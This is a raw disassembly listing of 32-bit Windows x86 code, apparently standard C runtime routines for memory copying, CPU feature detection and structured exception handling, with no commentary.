  40c8e5:	c8 40 00 08          	enter  $0x40,$0x8
  40c8e9:	c9                   	leave
  40c8ea:	40                   	inc    %eax
  40c8eb:	00 1c c9             	add    %bl,(%ecx,%ecx,8)
  40c8ee:	40                   	inc    %eax
  40c8ef:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  40c8f5:	c9                   	leave
  40c8f6:	c3                   	ret
  40c8f7:	90                   	nop
  40c8f8:	8a 46 03             	mov    0x3(%esi),%al
  40c8fb:	88 47 03             	mov    %al,0x3(%edi)
  40c8fe:	8b 45 08             	mov    0x8(%ebp),%eax
  40c901:	5e                   	pop    %esi
  40c902:	5f                   	pop    %edi
  40c903:	c9                   	leave
  40c904:	c3                   	ret
  40c905:	8d 49 00             	lea    0x0(%ecx),%ecx
  40c908:	8a 46 03             	mov    0x3(%esi),%al
  40c90b:	88 47 03             	mov    %al,0x3(%edi)
  40c90e:	8a 46 02             	mov    0x2(%esi),%al
  40c911:	88 47 02             	mov    %al,0x2(%edi)
  40c914:	8b 45 08             	mov    0x8(%ebp),%eax
  40c917:	5e                   	pop    %esi
  40c918:	5f                   	pop    %edi
  40c919:	c9                   	leave
  40c91a:	c3                   	ret
  40c91b:	90                   	nop
  40c91c:	8a 46 03             	mov    0x3(%esi),%al
  40c91f:	88 47 03             	mov    %al,0x3(%edi)
  40c922:	8a 46 02             	mov    0x2(%esi),%al
  40c925:	88 47 02             	mov    %al,0x2(%edi)
  40c928:	8a 46 01             	mov    0x1(%esi),%al
  40c92b:	88 47 01             	mov    %al,0x1(%edi)
  40c92e:	8b 45 08             	mov    0x8(%ebp),%eax
  40c931:	5e                   	pop    %esi
  40c932:	5f                   	pop    %edi
  40c933:	c9                   	leave
  40c934:	c3                   	ret
  40c935:	55                   	push   %ebp
  40c936:	8b ec                	mov    %esp,%ebp
  40c938:	83 ec 08             	sub    $0x8,%esp
  40c93b:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40c93e:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40c941:	8b 75 0c             	mov    0xc(%ebp),%esi
  40c944:	8b 7d 08             	mov    0x8(%ebp),%edi
  40c947:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40c94a:	c1 e9 07             	shr    $0x7,%ecx
  40c94d:	eb 06                	jmp    0x40c955
  40c94f:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  40c955:	66 0f 6f 06          	movdqa (%esi),%xmm0
  40c959:	66 0f 6f 4e 10       	movdqa 0x10(%esi),%xmm1
  40c95e:	66 0f 6f 56 20       	movdqa 0x20(%esi),%xmm2
  40c963:	66 0f 6f 5e 30       	movdqa 0x30(%esi),%xmm3
  40c968:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  40c96c:	66 0f 7f 4f 10       	movdqa %xmm1,0x10(%edi)
  40c971:	66 0f 7f 57 20       	movdqa %xmm2,0x20(%edi)
  40c976:	66 0f 7f 5f 30       	movdqa %xmm3,0x30(%edi)
  40c97b:	66 0f 6f 66 40       	movdqa 0x40(%esi),%xmm4
  40c980:	66 0f 6f 6e 50       	movdqa 0x50(%esi),%xmm5
  40c985:	66 0f 6f 76 60       	movdqa 0x60(%esi),%xmm6
  40c98a:	66 0f 6f 7e 70       	movdqa 0x70(%esi),%xmm7
  40c98f:	66 0f 7f 67 40       	movdqa %xmm4,0x40(%edi)
  40c994:	66 0f 7f 6f 50       	movdqa %xmm5,0x50(%edi)
  40c999:	66 0f 7f 77 60       	movdqa %xmm6,0x60(%edi)
  40c99e:	66 0f 7f 7f 70       	movdqa %xmm7,0x70(%edi)
  40c9a3:	8d b6 80 00 00 00    	lea    0x80(%esi),%esi
  40c9a9:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  40c9af:	49                   	dec    %ecx
  40c9b0:	75 a3                	jne    0x40c955
  40c9b2:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40c9b5:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40c9b8:	8b e5                	mov    %ebp,%esp
  40c9ba:	5d                   	pop    %ebp
  40c9bb:	c3                   	ret
  40c9bc:	55                   	push   %ebp
  40c9bd:	8b ec                	mov    %esp,%ebp
  40c9bf:	83 ec 1c             	sub    $0x1c,%esp
  40c9c2:	89 7d f4             	mov    %edi,-0xc(%ebp)
  40c9c5:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40c9c8:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40c9cb:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40c9ce:	8b c3                	mov    %ebx,%eax
  40c9d0:	99                   	cltd
  40c9d1:	8b c8                	mov    %eax,%ecx
  40c9d3:	8b 45 08             	mov    0x8(%ebp),%eax
  40c9d6:	33 ca                	xor    %edx,%ecx
  40c9d8:	2b ca                	sub    %edx,%ecx
  40c9da:	83 e1 0f             	and    $0xf,%ecx
  40c9dd:	33 ca                	xor    %edx,%ecx
  40c9df:	2b ca                	sub    %edx,%ecx
  40c9e1:	99                   	cltd
  40c9e2:	8b f8                	mov    %eax,%edi
  40c9e4:	33 fa                	xor    %edx,%edi
  40c9e6:	2b fa                	sub    %edx,%edi
  40c9e8:	83 e7 0f             	and    $0xf,%edi
  40c9eb:	33 fa                	xor    %edx,%edi
  40c9ed:	2b fa                	sub    %edx,%edi
  40c9ef:	8b d1                	mov    %ecx,%edx
  40c9f1:	0b d7                	or     %edi,%edx
  40c9f3:	75 4a                	jne    0x40ca3f
  40c9f5:	8b 75 10             	mov    0x10(%ebp),%esi
  40c9f8:	8b ce                	mov    %esi,%ecx
  40c9fa:	83 e1 7f             	and    $0x7f,%ecx
  40c9fd:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40ca00:	3b f1                	cmp    %ecx,%esi
  40ca02:	74 13                	je     0x40ca17
  40ca04:	2b f1                	sub    %ecx,%esi
  40ca06:	56                   	push   %esi
  40ca07:	53                   	push   %ebx
  40ca08:	50                   	push   %eax
  40ca09:	e8 27 ff ff ff       	call   0x40c935
  40ca0e:	83 c4 0c             	add    $0xc,%esp
  40ca11:	8b 45 08             	mov    0x8(%ebp),%eax
  40ca14:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40ca17:	85 c9                	test   %ecx,%ecx
  40ca19:	74 77                	je     0x40ca92
  40ca1b:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40ca1e:	8b 55 0c             	mov    0xc(%ebp),%edx
  40ca21:	03 d3                	add    %ebx,%edx
  40ca23:	2b d1                	sub    %ecx,%edx
  40ca25:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40ca28:	03 d8                	add    %eax,%ebx
  40ca2a:	2b d9                	sub    %ecx,%ebx
  40ca2c:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40ca2f:	8b 75 ec             	mov    -0x14(%ebp),%esi
  40ca32:	8b 7d f0             	mov    -0x10(%ebp),%edi
  40ca35:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40ca38:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40ca3a:	8b 45 08             	mov    0x8(%ebp),%eax
  40ca3d:	eb 53                	jmp    0x40ca92
  40ca3f:	3b cf                	cmp    %edi,%ecx
  40ca41:	75 35                	jne    0x40ca78
  40ca43:	f7 d9                	neg    %ecx
  40ca45:	83 c1 10             	add    $0x10,%ecx
  40ca48:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40ca4b:	8b 75 0c             	mov    0xc(%ebp),%esi
  40ca4e:	8b 7d 08             	mov    0x8(%ebp),%edi
  40ca51:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40ca54:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40ca56:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ca59:	03 4d e4             	add    -0x1c(%ebp),%ecx
  40ca5c:	8b 55 0c             	mov    0xc(%ebp),%edx
  40ca5f:	03 55 e4             	add    -0x1c(%ebp),%edx
  40ca62:	8b 45 10             	mov    0x10(%ebp),%eax
  40ca65:	2b 45 e4             	sub    -0x1c(%ebp),%eax
  40ca68:	50                   	push   %eax
  40ca69:	52                   	push   %edx
  40ca6a:	51                   	push   %ecx
  40ca6b:	e8 4c ff ff ff       	call   0x40c9bc
  40ca70:	83 c4 0c             	add    $0xc,%esp
  40ca73:	8b 45 08             	mov    0x8(%ebp),%eax
  40ca76:	eb 1a                	jmp    0x40ca92
  40ca78:	8b 75 0c             	mov    0xc(%ebp),%esi
  40ca7b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40ca7e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40ca81:	8b d1                	mov    %ecx,%edx
  40ca83:	c1 e9 02             	shr    $0x2,%ecx
  40ca86:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40ca88:	8b ca                	mov    %edx,%ecx
  40ca8a:	83 e1 03             	and    $0x3,%ecx
  40ca8d:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40ca8f:	8b 45 08             	mov    0x8(%ebp),%eax
  40ca92:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40ca95:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40ca98:	8b 7d f4             	mov    -0xc(%ebp),%edi
  40ca9b:	8b e5                	mov    %ebp,%esp
  40ca9d:	5d                   	pop    %ebp
  40ca9e:	c3                   	ret
  40ca9f:	83 25 24 81 42 00 00 	andl   $0x0,0x428124
  40caa6:	e8 58 00 00 00       	call   0x40cb03
  40caab:	a3 24 81 42 00       	mov    %eax,0x428124
  40cab0:	33 c0                	xor    %eax,%eax
  40cab2:	c3                   	ret
  40cab3:	6a 0c                	push   $0xc
  40cab5:	68 00 f7 40 00       	push   $0x40f700
  40caba:	e8 b1 00 00 00       	call   0x40cb70
  40cabf:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40cac3:	66 0f 28 c1          	movapd %xmm1,%xmm0
  40cac7:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  40cace:	eb 23                	jmp    0x40caf3
  40cad0:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40cad3:	8b 00                	mov    (%eax),%eax
  40cad5:	8b 00                	mov    (%eax),%eax
  40cad7:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  40cadc:	74 0a                	je     0x40cae8
  40cade:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  40cae3:	74 03                	je     0x40cae8
  40cae5:	33 c0                	xor    %eax,%eax
  40cae7:	c3                   	ret
  40cae8:	33 c0                	xor    %eax,%eax
  40caea:	40                   	inc    %eax
  40caeb:	c3                   	ret
  40caec:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40caef:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40caf3:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40cafa:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40cafd:	e8 b3 00 00 00       	call   0x40cbb5
  40cb02:	c3                   	ret
  40cb03:	55                   	push   %ebp
  40cb04:	8b ec                	mov    %esp,%ebp
  40cb06:	83 ec 18             	sub    $0x18,%esp
  40cb09:	33 c0                	xor    %eax,%eax
  40cb0b:	53                   	push   %ebx
  40cb0c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40cb0f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40cb12:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40cb15:	53                   	push   %ebx
  40cb16:	9c                   	pushf
  40cb17:	58                   	pop    %eax
  40cb18:	8b c8                	mov    %eax,%ecx
  40cb1a:	35 00 00 20 00       	xor    $0x200000,%eax
  40cb1f:	50                   	push   %eax
  40cb20:	9d                   	popf
  40cb21:	9c                   	pushf
  40cb22:	5a                   	pop    %edx
  40cb23:	2b d1                	sub    %ecx,%edx
  40cb25:	74 1f                	je     0x40cb46
  40cb27:	51                   	push   %ecx
  40cb28:	9d                   	popf
  40cb29:	33 c0                	xor    %eax,%eax
  40cb2b:	0f a2                	cpuid
  40cb2d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40cb30:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  40cb33:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40cb36:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40cb39:	b8 01 00 00 00       	mov    $0x1,%eax
  40cb3e:	0f a2                	cpuid
  40cb40:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40cb43:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40cb46:	5b                   	pop    %ebx
  40cb47:	f7 45 fc 00 00 00 04 	testl  $0x4000000,-0x4(%ebp)
  40cb4e:	74 0e                	je     0x40cb5e
  40cb50:	e8 5e ff ff ff       	call   0x40cab3
  40cb55:	85 c0                	test   %eax,%eax
  40cb57:	74 05                	je     0x40cb5e
  40cb59:	33 c0                	xor    %eax,%eax
  40cb5b:	40                   	inc    %eax
  40cb5c:	eb 02                	jmp    0x40cb60
  40cb5e:	33 c0                	xor    %eax,%eax
  40cb60:	5b                   	pop    %ebx
  40cb61:	c9                   	leave
  40cb62:	c3                   	ret
  40cb63:	e8 9b ff ff ff       	call   0x40cb03
  40cb68:	a3 28 81 42 00       	mov    %eax,0x428128
  40cb6d:	33 c0                	xor    %eax,%eax
  40cb6f:	c3                   	ret
  40cb70:	68 d0 cb 40 00       	push   $0x40cbd0
  40cb75:	64 ff 35 00 00 00 00 	push   %fs:0x0
  40cb7c:	8b 44 24 10          	mov    0x10(%esp),%eax
  40cb80:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  40cb84:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  40cb88:	2b e0                	sub    %eax,%esp
  40cb8a:	53                   	push   %ebx
  40cb8b:	56                   	push   %esi
  40cb8c:	57                   	push   %edi
  40cb8d:	a1 00 10 41 00       	mov    0x411000,%eax
  40cb92:	31 45 fc             	xor    %eax,-0x4(%ebp)
  40cb95:	33 c5                	xor    %ebp,%eax
  40cb97:	50                   	push   %eax
  40cb98:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40cb9b:	ff 75 f8             	push   -0x8(%ebp)
  40cb9e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40cba1:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40cba8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40cbab:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40cbae:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40cbb4:	c3                   	ret
  40cbb5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40cbb8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40cbbf:	59                   	pop    %ecx
  40cbc0:	5f                   	pop    %edi
  40cbc1:	5f                   	pop    %edi
  40cbc2:	5e                   	pop    %esi
  40cbc3:	5b                   	pop    %ebx
  40cbc4:	8b e5                	mov    %ebp,%esp
  40cbc6:	5d                   	pop    %ebp
  40cbc7:	51                   	push   %ecx
  40cbc8:	c3                   	ret
  40cbc9:	cc                   	int3
  40cbca:	cc                   	int3
  40cbcb:	cc                   	int3
  40cbcc:	cc                   	int3
  40cbcd:	cc                   	int3
  40cbce:	cc                   	int3
  40cbcf:	cc                   	int3
  40cbd0:	83 ec 14             	sub    $0x14,%esp
  40cbd3:	53                   	push   %ebx
  40cbd4:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40cbd8:	55                   	push   %ebp
  40cbd9:	56                   	push   %esi
  40cbda:	8b 73 08             	mov    0x8(%ebx),%esi
  40cbdd:	33 35 00 10 41 00    	xor    0x411000,%esi
  40cbe3:	57                   	push   %edi
  40cbe4:	8b 06                	mov    (%esi),%eax
  40cbe6:	83 f8 fe             	cmp    $0xfffffffe,%eax
  40cbe9:	c6 44 24 13 00       	movb   $0x0,0x13(%esp)
  40cbee:	c7 44 24 18 01 00 00 	movl   $0x1,0x18(%esp)
  40cbf5:	00 
  40cbf6:	8d 7b 10             	lea    0x10(%ebx),%edi
  40cbf9:	74 0d                	je     0x40cc08
  40cbfb:	8b 4e 04             	mov    0x4(%esi),%ecx
  40cbfe:	03 cf                	add    %edi,%ecx
  40cc00:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40cc03:	e8 5e 01 00 00       	call   0x40cd66
  40cc08:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40cc0b:	8b 46 08             	mov    0x8(%esi),%eax
  40cc0e:	03 cf                	add    %edi,%ecx
  40cc10:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40cc13:	e8 4e 01 00 00       	call   0x40cd66
  40cc18:	8b 44 24 28          	mov    0x28(%esp),%eax
  40cc1c:	f6 40 04 66          	testb  $0x66,0x4(%eax)
  40cc20:	0f 85 1f 01 00 00    	jne    0x40cd45
  40cc26:	8b 6b 0c             	mov    0xc(%ebx),%ebp
  40cc29:	83 fd fe             	cmp    $0xfffffffe,%ebp
  40cc2c:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  40cc30:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  40cc34:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40cc38:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  40cc3c:	89 53 fc             	mov    %edx,-0x4(%ebx)
  40cc3f:	74 5e                	je     0x40cc9f
  40cc41:	8d 44 6d 00          	lea    0x0(%ebp,%ebp,2),%eax
  40cc45:	8b 4c 86 14          	mov    0x14(%esi,%eax,4),%ecx
  40cc49:	85 c9                	test   %ecx,%ecx
  40cc4b:	8d 5c 86 10          	lea    0x10(%esi,%eax,4),%ebx
  40cc4f:	8b 03                	mov    (%ebx),%eax
  40cc51:	89 44 24 14          	mov    %eax,0x14(%esp)
  40cc55:	74 16                	je     0x40cc6d
  40cc57:	8b d7                	mov    %edi,%edx
  40cc59:	e8 0c 02 00 00       	call   0x40ce6a
  40cc5e:	85 c0                	test   %eax,%eax
  40cc60:	c6 44 24 13 01       	movb   $0x1,0x13(%esp)
  40cc65:	7c 44                	jl     0x40ccab
  40cc67:	7f 4c                	jg     0x40ccb5
  40cc69:	8b 44 24 14          	mov    0x14(%esp),%eax
  40cc6d:	83 f8 fe             	cmp    $0xfffffffe,%eax
  40cc70:	8b e8                	mov    %eax,%ebp
  40cc72:	75 cd                	jne    0x40cc41
  40cc74:	80 7c 24 13 00       	cmpb   $0x0,0x13(%esp)
  40cc79:	74 24                	je     0x40cc9f
  40cc7b:	8b 06                	mov    (%esi),%eax
  40cc7d:	83 f8 fe             	cmp    $0xfffffffe,%eax
  40cc80:	74 0d                	je     0x40cc8f
  40cc82:	8b 4e 04             	mov    0x4(%esi),%ecx
  40cc85:	03 cf                	add    %edi,%ecx
  40cc87:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40cc8a:	e8 d7 00 00 00       	call   0x40cd66
  40cc8f:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40cc92:	8b 46 08             	mov    0x8(%esi),%eax
  40cc95:	03 cf                	add    %edi,%ecx
  40cc97:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40cc9a:	e8 c7 00 00 00       	call   0x40cd66
  40cc9f:	8b 44 24 18          	mov    0x18(%esp),%eax
  40cca3:	5f                   	pop    %edi
  40cca4:	5e                   	pop    %esi
  40cca5:	5d                   	pop    %ebp
  40cca6:	5b                   	pop    %ebx
  40cca7:	83 c4 14             	add    $0x14,%esp
  40ccaa:	c3                   	ret
  40ccab:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  40ccb2:	00 
  40ccb3:	eb c6                	jmp    0x40cc7b
  40ccb5:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  40ccb9:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%ecx)
  40ccbf:	75 2a                	jne    0x40cceb
  40ccc1:	83 3d 20 81 42 00 00 	cmpl   $0x0,0x428120
  40ccc8:	74 21                	je     0x40cceb
  40ccca:	68 20 81 42 00       	push   $0x428120
  40cccf:	e8 7c 02 00 00       	call   0x40cf50
  40ccd4:	83 c4 04             	add    $0x4,%esp
  40ccd7:	85 c0                	test   %eax,%eax
  40ccd9:	74 10                	je     0x40cceb
  40ccdb:	8b 54 24 28          	mov    0x28(%esp),%edx
  40ccdf:	6a 01                	push   $0x1
  40cce1:	52                   	push   %edx
  40cce2:	ff 15 20 81 42 00    	call   *0x428120
  40cce8:	83 c4 08             	add    $0x8,%esp
  40cceb:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  40ccef:	e8 a6 01 00 00       	call   0x40ce9a
  40ccf4:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40ccf8:	39 68 0c             	cmp    %ebp,0xc(%eax)
  40ccfb:	74 13                	je     0x40cd10
  40ccfd:	68 00 10 41 00       	push   $0x411000
  40cd02:	57                   	push   %edi
  40cd03:	8b d5                	mov    %ebp,%edx
  40cd05:	8b c8                	mov    %eax,%ecx
  40cd07:	e8 a8 01 00 00       	call   0x40ceb4
  40cd0c:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40cd10:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40cd14:	89 48 0c             	mov    %ecx,0xc(%eax)
  40cd17:	8b 06                	mov    (%esi),%eax
  40cd19:	83 f8 fe             	cmp    $0xfffffffe,%eax
  40cd1c:	74 0d                	je     0x40cd2b
  40cd1e:	8b 4e 04             	mov    0x4(%esi),%ecx
  40cd21:	03 cf                	add    %edi,%ecx
  40cd23:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40cd26:	e8 3b 00 00 00       	call   0x40cd66
  40cd2b:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40cd2e:	8b 56 08             	mov    0x8(%esi),%edx
  40cd31:	03 cf                	add    %edi,%ecx
  40cd33:	33 0c 3a             	xor    (%edx,%edi,1),%ecx
  40cd36:	e8 2b 00 00 00       	call   0x40cd66
  40cd3b:	8b 4b 08             	mov    0x8(%ebx),%ecx
  40cd3e:	8b d7                	mov    %edi,%edx
  40cd40:	e9 3c 01 00 00       	jmp    0x40ce81
  40cd45:	83 7b 0c fe          	cmpl   $0xfffffffe,0xc(%ebx)
  40cd49:	0f 84 50 ff ff ff    	je     0x40cc9f
  40cd4f:	68 00 10 41 00       	push   $0x411000
  40cd54:	57                   	push   %edi
  40cd55:	8b cb                	mov    %ebx,%ecx
  40cd57:	ba fe ff ff ff       	mov    $0xfffffffe,%edx
  40cd5c:	e8 53 01 00 00       	call   0x40ceb4
  40cd61:	e9 15 ff ff ff       	jmp    0x40cc7b
  40cd66:	3b 0d 00 10 41 00    	cmp    0x411000,%ecx
  40cd6c:	75 02                	jne    0x40cd70
  40cd6e:	f3 c3                	repz ret
  40cd70:	e9 96 02 00 00       	jmp    0x40d00b
  40cd75:	cc                   	int3
  40cd76:	cc                   	int3
  40cd77:	cc                   	int3
  40cd78:	53                   	push   %ebx
  40cd79:	56                   	push   %esi
  40cd7a:	57                   	push   %edi
  40cd7b:	8b 54 24 10          	mov    0x10(%esp),%edx
  40cd7f:	8b 44 24 14          	mov    0x14(%esp),%eax
  40cd83:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40cd87:	55                   	push   %ebp
  40cd88:	52                   	push   %edx
  40cd89:	50                   	push   %eax
  40cd8a:	51                   	push   %ecx
  40cd8b:	51                   	push   %ecx
  40cd8c:	68 08 ce 40 00       	push   $0x40ce08
  40cd91:	64 ff 35 00 00 00 00 	push   %fs:0x0
  40cd98:	a1 00 10 41 00       	mov    0x411000,%eax
  40cd9d:	33 c4                	xor    %esp,%eax
  40cd9f:	89 44 24 08          	mov    %eax,0x8(%esp)
  40cda3:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40cdaa:	8b 44 24 30          	mov    0x30(%esp),%eax
  40cdae:	8b 58 08             	mov    0x8(%eax),%ebx
  40cdb1:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  40cdb5:	33 19                	xor    (%ecx),%ebx
  40cdb7:	8b 70 0c             	mov    0xc(%eax),%esi
  40cdba:	83 fe fe             	cmp    $0xfffffffe,%esi
  40cdbd:	74 3b                	je     0x40cdfa
  40cdbf:	8b 54 24 34          	mov    0x34(%esp),%edx
  40cdc3:	83 fa fe             	cmp    $0xfffffffe,%edx
  40cdc6:	74 04                	je     0x40cdcc
  40cdc8:	3b f2                	cmp    %edx,%esi
  40cdca:	76 2e                	jbe    0x40cdfa
  40cdcc:	8d 34 76             	lea    (%esi,%esi,2),%esi
  40cdcf:	8d 5c b3 10          	lea    0x10(%ebx,%esi,4),%ebx
  40cdd3:	8b 0b                	mov    (%ebx),%ecx
  40cdd5:	89 48 0c             	mov    %ecx,0xc(%eax)
  40cdd8:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  40cddc:	75 cc                	jne    0x40cdaa
  40cdde:	68 01 01 00 00       	push   $0x101
  40cde3:	8b 43 08             	mov    0x8(%ebx),%eax
  40cde6:	e8 3a 04 00 00       	call   0x40d225
  40cdeb:	b9 01 00 00 00       	mov    $0x1,%ecx
  40cdf0:	8b 43 08             	mov    0x8(%ebx),%eax
  40cdf3:	e8 4c 04 00 00       	call   0x40d244
  40cdf8:	eb b0                	jmp    0x40cdaa
  40cdfa:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  40ce01:	83 c4 18             	add    $0x18,%esp
  40ce04:	5f                   	pop    %edi
  40ce05:	5e                   	pop    %esi
  40ce06:	5b                   	pop    %ebx
  40ce07:	c3                   	ret
  40ce08:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40ce0c:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  40ce13:	b8 01 00 00 00       	mov    $0x1,%eax
  40ce18:	74 33                	je     0x40ce4d
  40ce1a:	8b 44 24 08          	mov    0x8(%esp),%eax
  40ce1e:	8b 48 08             	mov    0x8(%eax),%ecx
  40ce21:	33 c8                	xor    %eax,%ecx
  40ce23:	e8 3e ff ff ff       	call   0x40cd66
  40ce28:	55                   	push   %ebp
  40ce29:	8b 68 18             	mov    0x18(%eax),%ebp
  40ce2c:	ff 70 0c             	push   0xc(%eax)
  40ce2f:	ff 70 10             	push   0x10(%eax)
  40ce32:	ff 70 14             	push   0x14(%eax)
  40ce35:	e8 3e ff ff ff       	call   0x40cd78
  40ce3a:	83 c4 0c             	add    $0xc,%esp
  40ce3d:	5d                   	pop    %ebp
  40ce3e:	8b 44 24 08          	mov    0x8(%esp),%eax
  40ce42:	8b 54 24 10          	mov    0x10(%esp),%edx
  40ce46:	89 02                	mov    %eax,(%edx)
  40ce48:	b8 03 00 00 00       	mov    $0x3,%eax
  40ce4d:	c3                   	ret
  40ce4e:	55                   	push   %ebp
  40ce4f:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40ce53:	8b 29                	mov    (%ecx),%ebp
  40ce55:	ff 71 1c             	push   0x1c(%ecx)
  40ce58:	ff 71 18             	push   0x18(%ecx)
  40ce5b:	ff 71 28             	push   0x28(%ecx)
  40ce5e:	e8 15 ff ff ff       	call   0x40cd78
  40ce63:	83 c4 0c             	add    $0xc,%esp
  40ce66:	5d                   	pop    %ebp
  40ce67:	c2 04 00             	ret    $0x4
  40ce6a:	55                   	push   %ebp
  40ce6b:	56                   	push   %esi
  40ce6c:	57                   	push   %edi
  40ce6d:	53                   	push   %ebx
  40ce6e:	8b ea                	mov    %edx,%ebp
  40ce70:	33 c0                	xor    %eax,%eax
  40ce72:	33 db                	xor    %ebx,%ebx
  40ce74:	33 d2                	xor    %edx,%edx
  40ce76:	33 f6                	xor    %esi,%esi
  40ce78:	33 ff                	xor    %edi,%edi
  40ce7a:	ff d1                	call   *%ecx
  40ce7c:	5b                   	pop    %ebx
  40ce7d:	5f                   	pop    %edi
  40ce7e:	5e                   	pop    %esi
  40ce7f:	5d                   	pop    %ebp
  40ce80:	c3                   	ret
  40ce81:	8b ea                	mov    %edx,%ebp
  40ce83:	8b f1                	mov    %ecx,%esi
  40ce85:	8b c1                	mov    %ecx,%eax
  40ce87:	6a 01                	push   $0x1
  40ce89:	e8 97 03 00 00       	call   0x40d225
  40ce8e:	33 c0                	xor    %eax,%eax
  40ce90:	33 db                	xor    %ebx,%ebx
  40ce92:	33 c9                	xor    %ecx,%ecx
  40ce94:	33 d2                	xor    %edx,%edx
  40ce96:	33 ff                	xor    %edi,%edi
  40ce98:	ff e6                	jmp    *%esi
  40ce9a:	55                   	push   %ebp
  40ce9b:	8b ec                	mov    %esp,%ebp
  40ce9d:	53                   	push   %ebx
  40ce9e:	56                   	push   %esi
  40ce9f:	57                   	push   %edi
  40cea0:	6a 00                	push   $0x0
  40cea2:	6a 00                	push   $0x0
  40cea4:	68 af ce 40 00       	push   $0x40ceaf
  40cea9:	51                   	push   %ecx
  40ceaa:	e8 a1 03 00 00       	call   0x40d250
  40ceaf:	5f                   	pop    %edi
  40ceb0:	5e                   	pop    %esi
  40ceb1:	5b                   	pop    %ebx
  40ceb2:	5d                   	pop    %ebp
  40ceb3:	c3                   	ret
  40ceb4:	55                   	push   %ebp
  40ceb5:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  40ceb9:	52                   	push   %edx
  40ceba:	51                   	push   %ecx
  40cebb:	ff 74 24 14          	push   0x14(%esp)
  40cebf:	e8 b4 fe ff ff       	call   0x40cd78
  40cec4:	83 c4 0c             	add    $0xc,%esp
  40cec7:	5d                   	pop    %ebp
  40cec8:	c2 08 00             	ret    $0x8
  40cecb:	cc                   	int3
  40cecc:	cc                   	int3
  40cecd:	cc                   	int3
  40cece:	cc                   	int3
  40cecf:	cc                   	int3
  40ced0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40ced4:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%ecx)
